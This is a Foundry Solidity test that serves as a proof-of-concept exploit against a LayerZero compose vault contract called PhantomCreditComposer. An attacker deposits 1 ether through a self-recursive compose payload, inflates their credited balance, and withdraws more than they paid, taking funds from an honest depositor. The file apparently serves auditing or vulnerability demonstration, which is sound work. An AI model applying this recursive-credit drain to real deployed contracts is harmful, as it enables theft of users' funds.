// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { PhantomCreditComposer } from "../src/PhantomCreditComposer.sol";
import { ILayerZeroEndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { console2 } from "forge-std/console2.sol";

contract RealPhantomCreditDrain is TestHelperOz5 {
    PhantomCreditComposer vault;
    uint32 chainEid = 1;
    address ATTACKER = address(0xDEAD);
    address VICTIM_DEPOSITOR = address(0xBEEF);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(1, LibraryType.UltraLightNode);
        vault = new PhantomCreditComposer(address(endpoints[chainEid]));
    }

    function test_ATTACK_PhantomCreditDrain_ON_REAL_CODE() public {
        ILayerZeroEndpointV2 endpoint = ILayerZeroEndpointV2(address(endpoints[chainEid]));

        // Honest depositor funds the vault with 5 ether via a NON-recursive
        // compose (depth starts at MAX_DEPTH so it won't recurse).
        vm.deal(VICTIM_DEPOSITOR, 5 ether);
        bytes32 honestGuid = keccak256("honest-deposit");
        bytes memory honestMsg = abi.encode(uint16(4), VICTIM_DEPOSITOR);
        vm.prank(VICTIM_DEPOSITOR);
        endpoint.sendCompose(address(vault), honestGuid, 0, honestMsg);
        vm.prank(VICTIM_DEPOSITOR);
        endpoint.lzCompose{value: 5 ether}(VICTIM_DEPOSITOR, address(vault), honestGuid, 0, honestMsg, bytes(""));

        console2.log("Real contract ETH balance after honest deposit:", address(vault).balance);
        console2.log("Honest depositor's credited balance:", vault.vaultCredit(VICTIM_DEPOSITOR));

        // ATTACKER pays exactly 1 ether once, but self-recurses, embedding
        // THEIR OWN address as "beneficiary" in every nested payload.
        vm.deal(ATTACKER, 1 ether);
        bytes32 attackGuid = keccak256("attack-chain");
        bytes memory attackMsg = abi.encode(uint16(0), ATTACKER);

        vm.prank(ATTACKER);
        endpoint.sendCompose(address(vault), attackGuid, 0, attackMsg);
        vm.prank(ATTACKER);
        endpoint.lzCompose{value: 1 ether}(ATTACKER, address(vault), attackGuid, 0, attackMsg, bytes(""));

        console2.log("=== GROUND TRUTH AFTER ATTACK ===");
        console2.log("Attacker's REAL deposit:", uint256(1 ether));
        console2.log("Attacker's CREDITED vault balance:", vault.vaultCredit(ATTACKER));
        console2.log("Real total contract ETH balance:", address(vault).balance);

        uint256 attackerBalBefore = ATTACKER.balance;
        uint256 inflatedCredit = vault.vaultCredit(ATTACKER);

        console2.log("Attacker attempting to withdraw their FULL credited balance...");
        vm.prank(ATTACKER);
        try vault.withdraw(inflatedCredit) {
            uint256 actuallyWithdrawn = ATTACKER.balance - attackerBalBefore;
            console2.log("Withdrawal SUCCEEDED. Amount withdrawn:", actuallyWithdrawn);
            if (actuallyWithdrawn > 1 ether) {
                console2.log("!!!!! CONFIRMED DRAIN: withdrew MORE than the real 1 ether deposit !!!!!");
                console2.log("!!!!! Excess drained from honest depositor's funds:", actuallyWithdrawn - 1 ether);
            }
            console2.log("Remaining real contract balance:", address(vault).balance);
            console2.log("Honest depositor's credit afterward:", vault.vaultCredit(VICTIM_DEPOSITOR));
        } catch Error(string memory reason) {
            console2.log("Withdrawal REVERTED with reason:", reason);
        } catch (bytes memory data) {
            console2.log("Withdrawal REVERTED, data length:", data.length);
        }
    }
}
